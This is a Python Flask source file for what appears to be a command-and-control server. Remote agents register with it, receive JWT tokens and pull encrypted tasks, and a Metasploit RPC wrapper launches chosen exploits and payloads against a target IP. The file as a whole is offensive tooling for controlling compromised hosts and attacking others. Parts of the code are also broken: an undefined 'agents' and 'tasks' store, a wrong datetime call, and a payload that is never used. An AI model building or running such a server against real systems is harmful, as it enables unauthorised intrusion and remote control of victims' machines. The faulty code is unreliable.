import logging
from flask import Flask, request, jsonify
from flask_restful import Api, Resource
from cryptography.fernet import Fernet
import jwt
import datetime
from functools import wraps
from logging_config import setup_logging
from pymetasploit3.msfrpc import MsfRpcClient

class MetasploitIntegration:
    def __init__(self, password='your_password', port=55553):
        self.client = MsfRpcClient(password, port=port, ssl=True)
    
    def list_exploits(self):
        return self.client.modules.exploits
    
    def run_exploit(self, exploit_name, target_ip, payload_options=None):
        exploit = self.client.modules.use('exploit', exploit_name)
        exploit['RHOSTS'] = target_ip
        if payload_options:
            payload = self.client.modules.use('payload', payload_options['payload_name'])
            payload[payload_options['key']] = payload_options['value']
        return exploit.execute(payload=payload_options['payload_name'] if payload_options else None)

# Initialize logging
logger = setup_logging('server')

app = Flask(__name__)
api = Api(app)
app.config['SECRET_KEY'] = 'your-secret-key-here'  # Change in production

# Enhanced encryption
from crypto import encrypt_data, decrypt_data

# Authentication decorator
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            logger.warning("Unauthorized access attempt - no token")
            return {'message': 'Token is missing'}, 401
        
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
            current_user = data['user']
        except jwt.ExpiredSignatureError:
            logger.warning("Expired token attempt")
            return {'message': 'Token has expired'}, 401
        except jwt.InvalidTokenError:
            logger.warning("Invalid token attempt")
            return {'message': 'Token is invalid'}, 401
        
        return f(current_user, *args, **kwargs)
    return decorated

class AgentRegistration(Resource):
    def post(self):
        try:
            encrypted_data = request.get_json()['data']
            data = decrypt_data(encrypted_data)
            
            agent_id = data.get('agent_id')
            hostname = data.get('hostname')
            ip_address = data.get('ip_address')
            
            if agent_id:
                agents[agent_id] = {
                    'hostname': hostname,
                    'ip_address': ip_address,
                    'last_checkin': datetime.now().isoformat()
                }
                logger.info(f"New agent registered: {agent_id}")
                
                # Create token for agent
                token = jwt.encode({
                    'user': agent_id,
                    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
                }, app.config['SECRET_KEY'])
                
                encrypted_response = encrypt_data({
                    'status': 'success', 
                    'message': 'Agent registered',
                    'token': token
                })
                
                return {'data': encrypted_response}, 200
            return {'message': 'Invalid agent data'}, 400
            
        except Exception as e:
            logger.error(f"Registration error: {str(e)}")
            return {'message': 'Internal server error'}, 500

class TaskResource(Resource):
    @token_required
    def get(self, current_user, agent_id):
        try:
            if agent_id in tasks and tasks[agent_id]:
                task_data = {'task': tasks[agent_id].pop(0)}
                encrypted_task = encrypt_data(task_data)
                return {'data': encrypted_task}, 200
            return {'task': None}, 200
            
        except Exception as e:
            logger.error(f"Task retrieval error: {str(e)}")
            return {'message': 'Internal server error'}, 500
    
    @token_required
    def post(self, current_user, agent_id):
        try:
            encrypted_data = request.get_json()['data']
            data = decrypt_data(encrypted_data)
            
            if agent_id in agents:
                if agent_id not in tasks:
                    tasks[agent_id] = []
                tasks[agent_id].append(data['task'])
                logger.info(f"Task assigned to agent {agent_id}")
                return {'message': 'success'}, 200
            return {'message': 'Agent not found'}, 404
            
        except Exception as e:
            logger.error(f"Task assignment error: {str(e)}")
            return {'message': 'Internal server error'}, 500

api.add_resource(AgentRegistration, '/register')
api.add_resource(TaskResource, '/task/<string:agent_id>')

if __name__ == '__main__':
    # For production, use proper SSL certificates
    context = ('cert.pem', 'key.pem')  # Generate these with OpenSSL
    app.run(host='0.0.0.0', port=5000, ssl_context=context, debug=False)

